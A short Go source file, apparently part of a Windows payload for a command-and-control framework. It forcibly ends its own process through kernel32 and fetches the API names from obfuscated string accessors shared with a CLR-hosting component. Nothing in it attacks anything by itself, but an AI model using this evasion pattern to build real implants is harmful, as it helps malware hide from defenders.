// server/docker/payloads/SMB_Windows/exit_helpers_windows.go

//go:build windows
// +build windows

package main

import (
	"syscall"
)

// Exit helper string accessors - reuse CLR strings from clr_exit_prevention.go
// These avoid duplicating byte arrays by using existing CLR globals
func ehDllKernel32() string           { return clrDllKernel32() }
func ehProcGetCurrentProcess() string { return clrApiGetCurrentProc() }
func ehProcTerminateProcess() string  { return clrApiTerminateProcess() }

// forceTerminateWindows forcefully terminates the process on Windows
func forceTerminateWindows() {
	kernel32 := syscall.NewLazyDLL(ehDllKernel32())
	getCurrentProcess := kernel32.NewProc(ehProcGetCurrentProcess())
	terminateProcess := kernel32.NewProc(ehProcTerminateProcess())

	handle, _, _ := getCurrentProcess.Call()
	terminateProcess.Call(handle, 0)
}
